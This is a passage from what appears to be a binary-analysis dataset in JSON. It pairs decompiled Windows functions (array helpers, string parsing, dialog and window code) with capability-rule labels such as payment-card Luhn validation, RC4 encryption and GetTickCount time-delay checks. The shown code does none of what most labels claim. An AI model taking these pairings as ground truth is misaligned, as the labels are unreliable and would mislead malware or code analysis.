return 1;\n}\n",
        "token_count": 378
    },
    "00402210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402210(uint *arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t *in_ECX;\n    uint32_t uVar5;\n    \n    uVar5 = in_ECX[2];\n    if (in_ECX[1] == uVar5) {\n        puVar1 = *in_ECX;\n        if ((puVar1 <= arg_8h) && (arg_8h < puVar1 + uVar5)) {\n            fcn.00402f30(0x80004005);\n            pcVar2 = swi(3);\n            uVar4 = (*pcVar2)();\n            return uVar4;\n        }\n        if (uVar5 == 0) {\n            uVar5 = 1;\n        }\n        else {\n            uVar5 = in_ECX[1] * 2;\n            if (uVar5 < 0) {\n                return 0;\n            }\n            if (0x1fffffff < uVar5) {\n                return 0;\n            }\n        }\n        uVar3 = fcn.0043bd7a(puVar1, uVar5, 4);\n        if (uVar3 == 0) {\n            return 0;\n        }\n        in_ECX[2] = uVar5;\n        *in_ECX = uVar3;\n    }\n    puVar1 = *in_ECX + in_ECX[1] * 4;\n    if (puVar1 != NULL) {\n        *puVar1 = *arg_8h;\n    }\n    in_ECX[1] = in_ECX[1] + 1;\n    return 1;\n}\n",
        "token_count": 385
    },
    "00402290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402290(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint *puVar2;\n    \n    iVar1 = fcn.0043bd7a(*in_ECX, in_ECX[2] + 1, 4);\n    if (iVar1 != 0) {\n        *in_ECX = iVar1;\n        iVar1 = fcn.0043bd7a(in_ECX[1], in_ECX[2] + 1, 4);\n        if (iVar1 != 0) {\n            in_ECX[1] = iVar1;\n            iVar1 = in_ECX[2];\n            puVar2 = *in_ECX + iVar1 * 4;\n            if (puVar2 != NULL) {\n                *puVar2 = *arg_8h;\n            }\n            puVar2 = in_ECX[1] + iVar1 * 4;\n            if (puVar2 != NULL) {\n                *puVar2 = *arg_ch;\n            }\n            in_ECX[2] = in_ECX[2] + 1;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 271
    },
    "00402300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402300(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t *in_ECX;\n    int16_t *piVar7;\n    uint32_t uVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (arg_ch == NULL)) {\n        return 0;\n    }\n    piVar7 = arg_8h;\n    do {\n        iVar2 = *piVar7;\n        piVar7 = piVar7 + 1;\n    } while (iVar2 != 0);\n    uVar8 = (piVar7 - (arg_8h + 1) >> 1) * 2 + 2;\n    iVar3 = fcn.004303e0(-(uVar8 * 2 >> 0x20 != 0) | uVar8 * 2, 0x47cf34);\n    piVar7 = arg_ch;\n    do {\n        iVar2 = *piVar7;\n        piVar7 = piVar7 + 1;\n    } while (iVar2 != 0);\n    uVar1 = (piVar7 - (arg_ch + 1) >> 1) * 2 + 2;\n    iVar4 = fcn.004303e0(-(uVar1 * 2 >> 0x20 != 0) | uVar1 * 2, 0x47cf34);\n    if ((iVar3 != 0) && (iVar4 != 0)) {\n        if (uVar8 != 0) {\n            fcn.004312b0(iVar3, arg_8h, uVar8);\n        }\n        fcn.00402c90(0);\n        if (uVar1 != 0) {\n            fcn.004312b0(iVar4, arg_ch, uVar1);\n        }\n        fcn.00402c90(0);\n        iVar5 = fcn.0043bd7a(*in_ECX, in_ECX[2] + 1, 4);\n        if (iVar5 != 0) {\n            *in_ECX = iVar5;\n            iVar5 = fcn.0043bd7a(in_ECX[1], in_ECX[2] + 1, 4);\n            if (iVar5 != 0) {\n                in_ECX[1] = iVar5;\n                iVar5 = in_ECX[2];\n                piVar6 = *in_ECX + iVar5 * 4;\n                if (piVar6 != NULL) {\n                    *piVar6 = iVar3;\n                }\n                piVar6 = in_ECX[1] + iVar5 * 4;\n                if (piVar6 != NULL) {\n                    *piVar6 = iVar4;\n                }\n                in_ECX[2] = in_ECX[2] + 1;\n                iVar3 = 0;\n                iVar4 = 0;\n                uVar8 = 0;\n                goto code_r0x00402441;\n            }\n        }\n    }\n    uVar8 = 0x8007000e;\ncode_r0x00402441:\n    fcn.0042fb11(iVar4);\n    fcn.0042fb11(iVar3);\n    return ~uVar8 >> 0x1f;\n}\n",
        "token_count": 776
    },
    "00402b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b20(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    iVar2 = fcn.0043bd6f(arg_8h);\n    if (iVar2 != 0) {\n        *in_ECX = iVar2;\n        return;\n    }\n    fcn.00402f30(0x8007000e);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 119
    },
    "00402b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b50(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    iVar2 = fcn.0043bd6f(arg_8h);\n    if (iVar2 != 0) {\n        *in_ECX = iVar2;\n        return;\n    }\n    fcn.00402f30(0x8007000e);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 119
    },
    "00402b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b80(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    iVar2 = fcn.0043bd6f(arg_8h);\n    if (iVar2 != 0) {\n        *in_ECX = iVar2;\n        return;\n    }\n    fcn.00402f30(0x8007000e);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 119
    },
    "00402bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402bb0(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    iVar2 = fcn.0043bd6f(arg_8h);\n    if (iVar2 != 0) {\n        *in_ECX = iVar2;\n        return;\n    }\n    fcn.00402f30(0x8007000e);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 119
    },
    "004033c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004033c0(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    iVar2 = param_1[2];\n    if (0 < iVar2) {\n        do {\n            if ((iVar4 < 0) || (iVar2 <= iVar4)) {\ncode_r0x00403438:\n                fcn.00402f30(0x8000000b);\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            fcn.0042fb11(*(*param_1 + iVar4 * 4));\n            if (param_1[2] <= iVar4) goto code_r0x00403438;\n            fcn.0042fb11(*(param_1[1] + iVar4 * 4));\n            iVar2 = param_1[2];\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < iVar2);\n    }\n    if (*param_1 != 0) {\n        fcn.0043bd54(*param_1);\n        *param_1 = 0;\n    }\n    if (param_1[1] != 0) {\n        fcn.0043bd54(param_1[1]);\n        param_1[1] = 0;\n    }\n    param_1[2] = 0;\n    return 0;\n}\n",
        "token_count": 336
    },
    "00403fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00403fe0(int32_t param_1)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint arg_8h;\n    uint var_74h;\n    uint hWnd;\n    uint var_69h;\n    uint var_64h;\n    uint32_t var_60h;\n    int32_t var_48h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 4));\n    arg_8h = 0;\n    iVar4 = (*_sym.imp.USER32.dll_SendMessageW)(uVar3, 0x40c, 0, 0);\n    iVar6 = 0;\n    var_69h._0_1_ = 0;\n    if (iVar4 < 1) {\n        fcn.004303e9(arg_8h);\n        return;\n    }\n    while( true ) {\n        uVar7 = 100;\n        cVar2 = fcn.004066f0(6, 0, 0);\n        if ((cVar2 == '\\0') || (cVar2 = fcn.004065c0(),  cVar2 == '\\0')) {\n            uVar7 = 0x50;\n        }\n        var_64h = 0x11;\n        unique0x10000117 = uVar7;\n        fcn.00431db0(&var_60h, 0, 0x5c);\n        iVar5 = (*_sym.imp.USER32.dll_SendMessageW)(uVar3, 0x41c, iVar6, &var_69h + 1);\n        pcVar1 = _sym.imp.USER32.dll_PostMessageW;\n        if ((iVar5 != 0) && (var_48h == *(param_1 + 4))) break;\n        iVar6 = iVar6 + 1;\n        if (iVar4 <= iVar6) {\ncode_r0x00404088:\n            fcn.004303e9(arg_8h);\n            return;\n        }\n    }\n    if ((var_60h & 0x200) != 0) {\n        (*_sym.imp.USER32.dll_PostMessageW)(uVar3, 0x42b, iVar6, 0);\n        uVar3 = 0;\n        (*pcVar1)(*(param_1 + 4), 0x100, 0x28);\n        fcn.004303e9(uVar3);\n        return;\n    }\n    goto code_r0x00404088;\n}\n",
        "token_count": 624
    },
    "00405bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bb0(int16_t *arg_8h, int32_t arg_ch, int16_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    int16_t *piVar2;\n    \n    if (arg_ch != 0) {\n        uVar1 = 0;\n        piVar2 = arg_8h;\n        if (arg_ch != 1) {\n            do {\n                piVar2 = arg_8h;\n                if (*arg_10h == 0) break;\n                *arg_8h = *arg_10h;\n                piVar2 = arg_8h + 1;\n                if ((*arg_10h == 0x27) && (uVar1 = uVar1 + 1,  uVar1 < arg_ch - 1U)) {\n                    *piVar2 = 0x27;\n                    piVar2 = arg_8h + 2;\n                }\n                uVar1 = uVar1 + 1;\n                arg_10h = arg_10h + 1;\n                arg_8h = piVar2;\n            } while (uVar1 < arg_ch - 1U);\n        }\n        *piVar2 = 0;\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "004066f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "get OS version"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004066f0(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    uint arg_8h_00;\n    uint lpVersionInformation;\n    uint32_t var_11ch;\n    uint32_t var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    ushort var_ch;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    lpVersionInformation = 0x11c;\n    var_114h = 0;\n    var_110h = 0;\n    fcn.00431db0(&var_10ch, 0, 0x100);\n    pcVar1 = _sym.imp.KERNEL32.dll_VerSetConditionMask;\n    var_ah._0_2_ = 0;\n    stack0xfffffff4 = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_VerSetConditionMask)(0, 0, 2, 3, 1, 3, 0x20, 3);\n    uVar2 = (*pcVar1)(uVar2);\n    uVar2 = (*pcVar1)(uVar2);\n    var_11ch = arg_8h & 0xffff;\n    var_118h = arg_ch & 0xffff;\n    arg_8h_00 = 0x23;\n    var_ch = arg_10h;\n    (*_sym.imp.KERNEL32.dll_VerifyVersionInfoW)(&lpVersionInformation, 0x23, uVar2);\n    fcn.004303e9(arg_8h_00);\n    return;\n}\n",
        "token_count": 412
    },
    "00406910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406910(ushort *arg_8h)\n\n{\n    int16_t *piVar1;\n    int16_t *piVar2;\n    int16_t iVar3;\n    int16_t **in_ECX;\n    code *pcVar4;\n    int32_t iVar5;\n    ushort *puVar6;\n    int32_t iVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040d690();\n    pcVar4 = _sym.imp.USER32.dll_CharNextW;\n    piVar1 = *in_ECX;\n    iVar3 = *piVar1;\n    if (iVar3 != 0) {\n        puVar6 = arg_8h;\n        if (iVar3 != 0x27) {\n            do {\n    // switch table (24 cases) at 0x406a90\n                switch(iVar3) {\n                case 9:\n                case 10:\n                case 0xd:\n                case 0x20:\n                    goto code_r0x00406a74;\n                }\n                piVar2 = (*_sym.imp.USER32.dll_CharNextW)(piVar1);\n                *in_ECX = piVar2;\n                iVar7 = piVar2 - piVar1 >> 1;\n                if (arg_8h + 0x1000 <= puVar6 + iVar7 + 1) {\n                    return 0x80020009;\n                }\n                if (0 < iVar7) {\n                    iVar5 = piVar1 - puVar6;\n                    do {\n                        *puVar6 = *(iVar5 + puVar6);\n                        puVar6 = puVar6 + 1;\n                        iVar7 = iVar7 + -1;\n                    } while (iVar7 != 0);\n                }\n                piVar1 = *in_ECX;\n                iVar3 = *piVar1;\n            } while (iVar3 != 0);\ncode_r0x00406a74:\n            *puVar6 = 0;\n            return 0;\n        }\n        piVar1 = (*_sym.imp.USER32.dll_CharNextW)(piVar1);\n        *in_ECX = piVar1;\n        iVar3 = *piVar1;\n        if (iVar3 == 0) {\ncode_r0x0040697d:\n            if (**in_ECX != 0) {\n                *puVar6 = 0;\n                piVar1 = (*pcVar4)(*in_ECX);\n                *in_ECX = piVar1;\n                return 0;\n            }\n        }\n        else {\n            do {\n                if ((iVar3 == 0x27) && (piVar1 = (*pcVar4)(piVar1),  *piVar1 != 0x27)) goto code_r0x0040697d;\n                if (**in_ECX == 0x27) {\n                    piVar1 = (*pcVar4)(*in_ECX);\n                    *in_ECX = piVar1;\n                }\n                piVar1 = *in_ECX;\n                piVar2 = (*_sym.imp.USER32.dll_CharNextW)(piVar1);\n                *in_ECX = piVar2;\n                iVar7 = piVar2 - piVar1 >> 1;\n                if (arg_8h + 0x1000 <= puVar6 + iVar7 + 1) {\n                    return 0x80020009;\n                }\n                if (0 < iVar7) {\n                    iVar5 = piVar1 - puVar6;\n                    do {\n                        *puVar6 = *(iVar5 + puVar6);\n                        puVar6 = puVar6 + 1;\n                        iVar7 = iVar7 + -1;\n                    } while (iVar7 != 0);\n                }\n                piVar1 = *in_ECX;\n                iVar3 = *piVar1;\n                pcVar4 = _sym.imp.USER32.dll_CharNextW;\n            } while (iVar3 != 0);\n        }\n    }\n    return 0x80020009;\n}\n",
        "token_count": 864
    },
    "00406b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00406b40(void)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint uVar6;\n    char16_t *arg_8h;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_104h;\n    uint var_100h;\n    uint *var_fch;\n    char16_t *var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    int32_t var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    ulong uStack224;\n    uint var_d4h;\n    int32_t var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_b8h;\n    int32_t var_a4h;\n    int32_t var_94h;\n    uint var_7ch;\n    int32_t var_68h;\n    int32_t var_58h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar auStack20 [12];\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_108h = 0;\n    var_f8h = NULL;\n    var_f4h = 0;\n    var_f0h = 0;\n    cVar4 = fcn.00406560();\n    pcVar2 = _sym.imp.UxTheme.dll_BufferedPaintInit;\n    if (cVar4 != '\\0') {\n        (*_sym.imp.UxTheme.dll_BufferedPaintInit)();\n    }\n    var_ech = 0;\n    var_e8h = 2;\n    _var_e4h = CONCAT124(SUB1612(ZEXT816(0) >> 0x20, 0), 0x10);\n    var_d4h = 0;\n    fcn.00406690();\n    arg_8h = L\"dialog\";\n    var_cch = 0;\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n    iVar1 = (iVar5 + 1U) * 2;\n    var_d0h = fcn.0042fb08(-(iVar1 >> 0x20 != 0) | iVar1);\n    if (var_d0h != 0) {\n        uVar6 = fcn.0043be56(var_d0h, iVar5 + 1U, L\"dialog\");\n        fcn.00402c90(uVar6);\n    }\n    var_10ch = 0x47bdcc;\n    _var_c8h = ZEXT816(0);\n    fcn.00401640();\n    fcn.00401640();\n    var_3ch = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_20h = _sym.imp.USER32.dll_DefWindowProcW;\n    cVar4 = fcn.00406560();\n    if (cVar4 != '\\0') {\n        (*pcVar2)();\n    }\n    var_1ch = 0;\n    var_18h = 2;\n    _var_14h = CONCAT124(SUB1612(ZEXT816(0) >> 0x20, 0), 0x10);\n    var_40h = 0x47bdb8;\n    uVar6 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n    if (var_f8h == NULL) {\n        var_f8h = fcn.0042f74e();\n        if (var_f8h == NULL) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n            goto code_r0x00406d2a;\n        }\n    }\n    fcn.0042f850(var_f8h, 0, 0);\n    var_104h = &var_10ch;\n    var_100h = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x6c9c60);\n    var_fch = *0x6c9c78;\n    *0x6c9c78 = &var_104h;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x6c9c60);\n    (*_sym.imp.USER32.dll_DialogBoxParamW)(*0x6cc7e4, 100, uVar6, fcn.0040d6e0, 0);\ncode_r0x00406d2a:\n    pcVar2 = _sym.imp.UxTheme.dll_EndBufferedPaint;\n    if (var_1ch != 0) {\n        (*_sym.imp.UxTheme.dll_EndBufferedPaint)(var_1ch, 1);\n        var_1ch = 0;\n    }\n    cVar4 = fcn.00406560();\n    pcVar3 = _sym.imp.UxTheme.dll_BufferedPaintUnInit;\n    if (cVar4 != '\\0') {\n        (*_sym.imp.UxTheme.dll_BufferedPaintUnInit)();\n    }\n    if (var_2ch != 0) {\n        fcn.0042f7fa(var_2ch);\n    }\n    if (var_58h != 0) {\n        (*pcVar2)(var_58h, 1);\n        var_58h = 0;\n    }\n    cVar4 = fcn.00406560();\n    if (cVar4 != '\\0') {\n        (*pcVar3)();\n    }\n    if (var_68h != 0) {\n        fcn.0042f7fa(var_68h);\n    }\n    if (var_94h != 0) {\n        (*pcVar2)(var_94h, 1);\n        var_94h = 0;\n    }\n    cVar4 = fcn.00406560();\n    if (cVar4 != '\\0') {\n        (*pcVar3)();\n    }\n    if (var_a4h != 0) {\n        fcn.0042f7fa(var_a4h);\n    }\n    fcn.0042fb11(var_d0h);\n    if (var_ech != 0) {\n        (*pcVar2)(var_ech, 1);\n        var_ech = 0;\n    }\n    cVar4 = fcn.00406560();\n    if (cVar4 != '\\0') {\n        (*pcVar3)();\n    }\n    if (var_f8h != NULL) {\n        arg_8h = var_f8h;\n        fcn.0042f7fa(var_f8h);\n    }\n    fcn.004303e9(arg_8h);\n    return;\n}\n",
        "token_count": 1560
    },
    "00407f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00407f90(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    char cVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    uint hDlg;\n    \n    uVar4 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 4));\n    fcn.00403200(uVar4);\n    uVar2 = *0x47bfac;\n    uVar6 = *0x47bfa8;\n    uVar4 = *0x47bfa4;\n    *(param_1 + 0x44) = *0x47bfa0;\n    *(param_1 + 0x48) = uVar4;\n    *(param_1 + 0x4c) = uVar6;\n    *(param_1 + 0x50) = uVar2;\n    iVar7 = param_1;\n    if (param_1 == -0x20) {\n        iVar7 = 0;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_IsWindow)(*(iVar7 + 4));\n    if ((iVar5 != 0) && (cVar3 = fcn.00406560(),  cVar3 != '\\0')) {\n        (*_sym.imp.dwmapi.dll_DwmExtendFrameIntoClientArea)(*(iVar7 + 4), param_1 + 0x44);\n    }\n    uVar4 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 4), 1000);\n    uVar6 = (**(*(param_1 + 0x54) + 8))();\n    pcVar1 = _sym.imp.USER32.dll_SetWindowLongW;\n    iVar7 = *(param_1 + 0x68);\n    if (iVar7 == 0) {\n        iVar7 = fcn.0042f74e();\n        *(param_1 + 0x68) = iVar7;\n        if (iVar7 != 0) goto code_r0x00408025;\n    }\n    else {\ncode_r0x00408025:\n        fcn.0042f850(iVar7, uVar6, param_1 + 0x54);\n        uVar6 = fcn.0042f7b3(*(param_1 + 0x68));\n        iVar7 = (*pcVar1)(uVar4, 0xfffffffc, uVar6);\n        if (iVar7 != 0) {\n            *(param_1 + 0x74) = iVar7;\n            *(param_1 + 0x58) = uVar4;\n        }\n    }\n    uVar4 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 4), 0x3e9);\n    uVar6 = (**(*(param_1 + 0x90) + 8))();\n    iVar7 = *(param_1 + 0xa4);\n    if (iVar7 == 0) {\n        iVar7 = fcn.0042f74e();\n        *(param_1 + 0xa4) = iVar7;\n        if (iVar7 == 0) goto code_r0x004080a1;\n    }\n    fcn.0042f850(iVar7, uVar6, param_1 + 0x90);\n    uVar6 = fcn.0042f7b3(*(param_1 + 0xa4));\n    iVar7 = (*pcVar1)(uVar4, 0xfffffffc, uVar6);\n    if (iVar7 != 0) {\n        *(param_1 + 0xb0) = iVar7;\n        *(param_1 + 0x94) = uVar4;\n    }\ncode_r0x004080a1:\n    uVar4 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 4), 1);\n    uVar6 = (**(*(param_1 + 0xcc) + 8))();\n    iVar7 = *(param_1 + 0xe0);\n    if (iVar7 == 0) {\n        iVar7 = fcn.0042f74e();\n        *(param_1 + 0xe0) = iVar7;\n        if (iVar7 == 0) {\n            return 1;\n        }\n    }\n    fcn.0042f850(iVar7, uVar6, param_1 + 0xcc);\n    uVar6 = fcn.0042f7b3(*(param_1 + 0xe0));\n    iVar7 = (*pcVar1)(uVar4, 0xfffffffc, uVar6);\n    if (iVar7 != 0) {\n        *(param_1 + 0xec) = iVar7;\n        *(param_1 + 0xd0) = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 1085
    },
    "0040bee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040bee0(uint arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t *in_ECX;\n    uint32_t uVar5;\n    \n    uVar5 = in_ECX[2];\n    if (in_ECX[1] == uVar5) {\n        puVar1 = *in_ECX;\n        if ((puVar1 <= &arg_8h) && (&arg_8h < puVar1 + uVar5)) {\n            fcn.00402f30(0x80004005);\n            pcVar2 = swi(3);\n            uVar4 = (*pcVar2)();\n            return uVar4;\n        }\n        if (uVar5 == 0) {\n            uVar5 = 1;\n        }\n        else {\n            uVar5 = in_ECX[1] * 2;\n            if (uVar5 < 0) {\n                return 0;\n            }\n            if (0x1fffffff < uVar5) {\n                return 0;\n            }\n        }\n        uVar3 = fcn.0043bd7a(puVar1, uVar5, 4);\n        if (uVar3 == 0) {\n            return 0;\n        }\n        in_ECX[2] = uVar5;\n        *in_ECX = uVar3;\n    }\n    puVar1 = *in_ECX + in_ECX[1] * 4;\n    if (puVar1 != NULL) {\n        *puVar1 = arg_8h;\n    }\n    in_ECX[1] = in_ECX[1] + 1;\n    return 1;\n}\n",
        "token_count": 385
    },
    "0040cf70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cf70(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    \n    if ((arg_8h < 0) || (iVar2 = in_ECX[1],  iVar2 <= arg_8h)) {\n        return 0;\n    }\n    if (arg_8h == iVar2 + -1) goto code_r0x0040cff4;\n    uVar4 = (iVar2 - arg_8h) * 4;\n    iVar2 = *in_ECX + arg_8h * 4;\n    uVar1 = uVar4 - 4;\n    if (uVar1 == 0) {\ncode_r0x0040cfe9:\n        arg_8h_00 = 0;\n    }\n    else if ((iVar2 == 0) || (iVar2 + 4 == 0)) {\n        puVar3 = fcn.0043bcb5();\n        *puVar3 = 0x16;\n        fcn.0043bb3e();\n        arg_8h_00 = 0x16;\n    }\n    else {\n        if (uVar1 <= uVar4) {\n            fcn.00431830(iVar2, iVar2 + 4, uVar1);\n            goto code_r0x0040cfe9;\n        }\n        puVar3 = fcn.0043bcb5();\n        *puVar3 = 0x22;\n        fcn.0043bb3e();\n        arg_8h_00 = 0x22;\n    }\n    fcn.00402c90(arg_8h_00);\ncode_r0x0040cff4:\n    in_ECX[1] = in_ECX[1] + -1;\n    return 1;\n}\n",
        "token_count": 433
    },
    "0040d540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040d540(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x48) != 0) {\n        uVar1 = (*_sym.imp.COMCTL32.dll_ImageList_GetImageCount)(*(in_ECX + 0x48));\n        if (uVar1 != 0) goto code_r0x0040d59b;\n        (*_sym.imp.COMCTL32.dll_ImageList_Destroy)(*(in_ECX + 0x48));\n        *(in_ECX + 0x48) = 0;\n    }\n    uVar1 = arg_8h;\n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        *(in_ECX + 0x90) = arg_8h;\n        *(in_ECX + 0x98) = arg_8h + 6;\n        *(in_ECX + 0x9c) = arg_ch + 6;\n        *(in_ECX + 0x94) = arg_ch;\n        return CONCAT31(arg_ch + 6 >> 8, 1);\n    }\ncode_r0x0040d59b:\n    return uVar1 & 0xffffff00;\n}\n",
        "token_count": 293
    },
    "0040d690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d690(uint *param_1)\n\n{\n    uint uVar1;\n    \n    do {\n    // switch table (24 cases) at 0x40d6bc\n        switch(**param_1) {\n        case 9:\n        case 10:\n        case 0xd:\n        case 0x20:\n            uVar1 = (*_sym.imp.USER32.dll_CharNextW)(*param_1);\n            *param_1 = uVar1;\n            break;\n        default:\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 124
    },
    "0040eb80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
